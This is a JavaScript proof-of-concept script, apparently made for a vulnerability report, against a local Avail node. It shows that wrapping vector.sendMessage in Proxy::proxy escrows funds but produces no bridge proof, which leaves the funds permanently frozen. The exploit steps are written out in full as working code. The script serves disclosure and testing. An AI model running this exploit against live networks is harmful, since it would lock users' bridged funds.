/**
 * BONDA PoC — bridge-1: Proxy-wrapped Vector::send_message dropped from bridge root
 *
 * Proof:
 *   Proxy::proxy { real: Alice, call: Vector::send_message } →
 *   runtime dispatch succeeds → MessageSubmitted event emitted (funds escrowed)
 *   BUT transaction_filter.rs:38: nb_iterations > 0 → None
 *   → the wrapped call's AddressedMessage does not enter bridged_root
 *   → no bridge/message leaf in kate_queryDataProof
 *   → _checkBridgeLeaf on the Ethereum side fails permanently = funds permanently frozen (LOSS OF FUNDS)
 *
 * Code references (commit 510ee26, specVersion 51):
 *   transaction_filter.rs:38 — nb_iterations > 0 → None (wrapped call DA/bridge extraction skipped)
 *
 * Comparison:
 *   BASELINE: Alice calls vector.sendMessage directly → MessageSubmitted ✓ + bridge proof ✓
 *   ATTACK  : Bob calls Proxy::proxy{real:Alice, call:sendMessage} → MessageSubmitted ✓ + bridge proof ✗
 */
"use strict";

const sdk = require("avail-js-sdk");

const WS  = process.env.WS_URL  || "ws://localhost:9944";
const RPC = process.env.RPC_URL || "http://localhost:9944";

function rpcPost(method, params) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({ jsonrpc: "2.0", id: 1, method, params });
    const url = new URL(RPC);
    const isHttps = url.protocol === "https:";
    const mod = isHttps ? require("node:https") : require("node:http");
    const opts = {
      hostname: url.hostname,
      port: url.port || (isHttps ? 443 : 80),
      path: url.pathname || "/",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
    };
    const req = mod.request(opts, (res) => {
      let data = "";
      res.on("data", d => data += d);
      res.on("end", () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
    });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

async function submitAndWait(api, tx, account) {
  return new Promise((resolve, reject) => {
    tx.signAndSend(account, ({ status, events, dispatchError }) => {
      if (dispatchError) {
        if (dispatchError.isModule) {
          const d = api.registry.findMetaError(dispatchError.asModule);
          return reject(new Error(`DispatchError: ${d.section}.${d.name}: ${d.docs}`));
        }
        return reject(new Error(`DispatchError: ${dispatchError.toString()}`));
      }
      if (status.isInBlock) resolve({ blockHash: status.asInBlock.toHex(), events });
    }).catch(reject);
  });
}

function txIndexFromEvents(events) {
  for (const { event, phase } of events) {
    if (phase.isApplyExtrinsic &&
        event.section === "system" &&
        (event.method === "ExtrinsicSuccess" || event.method === "ExtrinsicFailed")) {
      return phase.asApplyExtrinsic.toNumber();
    }
  }
  return -1;
}

async function waitFinalized(api, blockHash) {
  for (let i = 0; i < 60; i++) {
    const finalHead = await api.rpc.chain.getFinalizedHead();
    const finalNum = (await api.rpc.chain.getHeader(finalHead)).number.toNumber();
    const blockNum  = (await api.rpc.chain.getHeader(blockHash)).number.toNumber();
    if (finalNum >= blockNum) return;
    await new Promise(r => setTimeout(r, 1000));
  }
  console.log("  (finalization timeout — continuing anyway)");
}

async function main() {
  console.log("=".repeat(64));
  console.log("BONDA PoC — bridge-1");
  console.log("Proxy-wrapped send_message: MessageSubmitted YES, bridge proof NO");
  console.log("=".repeat(64));

  const api = await sdk.initialize(WS);
  const keyring = new sdk.polkadotApi.Keyring({ type: "sr25519" });
  const alice = keyring.addFromUri("//Alice");
  const bob   = keyring.addFromUri("//Bob");

  console.log(`\nChain: ${(await api.rpc.system.chain()).toHuman()}  specVersion: ${api.runtimeVersion.specVersion.toNumber()}`);
  console.log(`Alice: ${alice.address}`);
  console.log(`Bob  : ${bob.address}`);

  const msg    = api.createType("Message", { ArbitraryMessage: "0x424f4e4441" }); // "BONDA"
  const toH256 = "0x0000000000000000000000000000000000000000000000000000000000000001";
  const domain = 1;

  // ── STEP 1: sudo set whitelisted domains = [1] ───────────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[STEP 1] sudo: set whitelisted domains = [1]");
  try {
    const setDomains = api.tx.vector.setWhitelistedDomains([1]);
    const sudoTx = api.tx.sudo.sudo(setDomains);
    const { blockHash } = await submitAndWait(api, sudoTx, alice);
    console.log(`  done in block: ${blockHash}`);
  } catch (e) {
    console.log(`  (skipped or failed: ${e.message})`);
  }

  // ── BASELINE: Alice direct vector.sendMessage ────────────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[BASELINE] Alice direct vector.sendMessage (normal bridge path)");
  console.log("  expect: MessageSubmitted ✓ + kate bridge proof ✓");

  const baselineTx = api.tx.vector.sendMessage(msg, toH256, domain);
  const { blockHash: bh0, events: ev0 } = await submitAndWait(api, baselineTx, alice);
  const txIdx0 = txIndexFromEvents(ev0);
  const msgEv0 = ev0.find(e => e.event.section === "vector" && e.event.method === "MessageSubmitted");
  console.log(`  MessageSubmitted event: ${msgEv0 ? "YES ✓" : "NO ✗"}`);
  if (msgEv0) console.log(`    event.data: ${JSON.stringify(msgEv0.event.data.toHuman())}`);
  console.log(`  block: ${bh0}  txIndex: ${txIdx0}`);
  console.log("  waiting for finalization...");
  await waitFinalized(api, bh0);
  const proof0 = await rpcPost("kate_queryDataProof", [txIdx0, bh0]);
  const ok0 = !proof0.error && proof0.result != null;
  console.log(`  kate_queryDataProof RAW: ${JSON.stringify(proof0.error || proof0.result)}`);
  console.log(`  bridge proof: ${ok0 ? "EXISTS ✓" : "MISSING ✗"}`);
  if (ok0 && proof0.result) {
    const dp = proof0.result.dataProof || proof0.result;
    console.log(`    message leaf present: ${proof0.result.message != null ? "YES" : "NO"}`);
  }

  // ── STEP 2: Alice registers Bob as proxy ─────────────────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[STEP 2] Alice.proxy.addProxy(Bob, Any, delay=0)");
  try {
    const addProxyTx = api.tx.proxy.addProxy(bob.address, "Any", 0);
    const { blockHash: bh1 } = await submitAndWait(api, addProxyTx, alice);
    console.log(`  addProxy in block: ${bh1}`);
  } catch (e) {
    if (e.message.includes("Duplicate")) {
      console.log("  (already registered, skipping)");
    } else {
      throw e;
    }
  }

  // ── ATTACK: Bob proxies Alice's send_message ─────────────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[ATTACK] Bob.proxy.proxy(real=Alice, call=vector.sendMessage(...))");
  console.log("  expect: MessageSubmitted ✓ (funds escrowed) BUT bridge proof ✗ (MISSING)");

  const innerCall = api.tx.vector.sendMessage(msg, toH256, domain);
  const attackTx  = api.tx.proxy.proxy(alice.address, null, innerCall);
  const attackHash = attackTx.hash.toHex();

  const { blockHash: bh2, events: ev2 } = await submitAndWait(api, attackTx, bob);
  const txIdx2 = txIndexFromEvents(ev2);
  const msgEv2 = ev2.find(e => e.event.section === "vector" && e.event.method === "MessageSubmitted");
  console.log(`\n  tx hash: ${attackHash}`);
  console.log(`  block: ${bh2}  txIndex: ${txIdx2}`);
  console.log(`  MessageSubmitted event: ${msgEv2 ? "YES ✓  ← runtime dispatch succeeded, funds locked" : "NO ✗"}`);
  if (msgEv2) console.log(`    event.data: ${JSON.stringify(msgEv2.event.data.toHuman())}`);
  console.log("  waiting for finalization...");
  await waitFinalized(api, bh2);
  const proof2 = await rpcPost("kate_queryDataProof", [txIdx2, bh2]);
  const ok2 = !proof2.error && proof2.result != null;
  console.log(`  kate_queryDataProof RAW: ${JSON.stringify(proof2.error || proof2.result)}`);
  const hasMsgLeaf2 = ok2 && proof2.result && proof2.result.message != null;
  console.log(`  bridge proof: ${ok2 ? "EXISTS" : "MISSING ✗"}  message leaf present: ${hasMsgLeaf2 ? "YES" : "NO"}`);

  // ── RESULT ───────────────────────────────────────────────────────────────
  console.log("\n" + "=".repeat(64));
  console.log("RESULT");
  console.log("=".repeat(64));
  console.log(`\n  BASELINE (Alice direct sendMessage):`);
  console.log(`    MessageSubmitted: ${msgEv0 ? "YES ✓" : "NO ✗"}`);
  console.log(`    bridge proof: ${ok0 ? "EXISTS ✓" : "MISSING ✗"}`);
  console.log(`\n  ATTACK (Proxy::proxy{ sendMessage }):`);
  console.log(`    MessageSubmitted: ${msgEv2 ? "YES ✓  ← chain says bridge msg sent" : "NO ✗"}`);
  console.log(`    bridge proof: ${ok2 ? "EXISTS (proof present)" : "MISSING ✗"}  message leaf: ${hasMsgLeaf2 ? "YES" : "NO"}`);

  if (msgEv2 && (!ok2 || !hasMsgLeaf2)) {
    console.log("\n✅ CONFIRMED — bridge-1 reproduced on specVersion 51");
    console.log("   MessageSubmitted fires (funds escrowed) but no bridge proof / no message leaf.");
    console.log("\n   Root cause: transaction_filter.rs:38 if nb_iterations>0 {None}");
    console.log("   drops the wrapped call so its AddressedMessage never enters bridged_root.");
    console.log("   Inner send_message still dispatches (funds escrowed) → on Ethereum");
    console.log("   _checkBridgeLeaf can never be satisfied = permanent stuck funds.");
  } else if (msgEv2 && ok2 && hasMsgLeaf2) {
    console.log("\n⚠️  NOT REPRODUCED — proxy-wrapped send_message DID produce a bridge proof with a message leaf.");
    console.log("   The wrapped call was NOT dropped. Reporting honestly.");
  } else if (!msgEv2) {
    console.log("\n⚠️  MessageSubmitted did NOT fire — runtime rejected/filtered the wrapped call.");
    console.log("   If filtered at validation, this is a different (safer) behavior than the claim.");
  }

  console.log("─".repeat(64));
  await sdk.disconnect();
  process.exit(0);
}

main().catch(e => {
  console.error("\nError:", e.message || e);
  process.exit(1);
});
